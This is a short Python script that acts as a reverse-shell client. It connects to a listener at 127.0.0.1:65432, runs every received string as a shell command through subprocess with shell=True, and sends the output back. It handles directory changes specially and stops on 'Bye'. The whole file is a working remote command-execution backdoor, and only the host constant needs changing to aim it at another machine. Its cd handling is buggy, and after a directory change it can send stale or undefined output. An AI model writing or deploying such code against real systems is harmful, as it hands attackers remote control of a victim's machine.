import os
import re
import socket
import subprocess

HOST = '127.0.0.1'
PORT = 65432
PathCheck = False
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    while(True):
        data = s.recv(2048)
        #print("Recieved: ", data.decode())
        msg =  data.decode()    #input("Your command: ")
        if(msg.__contains__('cd')==True):
            split = msg.split()
            if re.search('[a-zA-Z]', split[1]):
                PathCheck = True
            if(PathCheck == True):
                os.getcwd()
                os.chdir(split[1])
            elif(msg == 'cd ..' or msg == "cd /"):
                os.chdir("..")
                output = subprocess.check_output('dir', shell=True, universal_newlines=True)
        else:
            output = subprocess.check_output(msg, shell=True, universal_newlines=True)
            #print("Output : \n",output)
        s.sendall(str.encode(output))
        if(msg == "Bye"):
            print("Bye")
            break
        #data = s.recv(2048)
        #print("Recieved: ", data.decode())
